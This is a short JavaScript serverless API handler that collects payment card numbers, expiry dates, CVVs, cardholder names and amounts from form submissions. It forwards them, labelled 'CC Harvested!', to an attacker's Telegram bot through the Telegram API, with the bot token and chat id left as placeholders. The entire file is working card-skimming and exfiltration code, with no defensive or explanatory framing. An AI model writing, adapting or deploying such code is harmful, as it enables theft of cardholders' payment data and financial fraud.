export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { cc, exp, cvv, name, amount } = req.body;
  const harvestData = `🆕 CC Harvested!\nCard: ${cc}\nExp: ${exp}\nCVV: ${cvv}\nName: ${name}\nAmount: $${amount}`;

  try {
    const response = await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(harvestData)}`);
    if (response.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: 'Telegram send failed' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
}
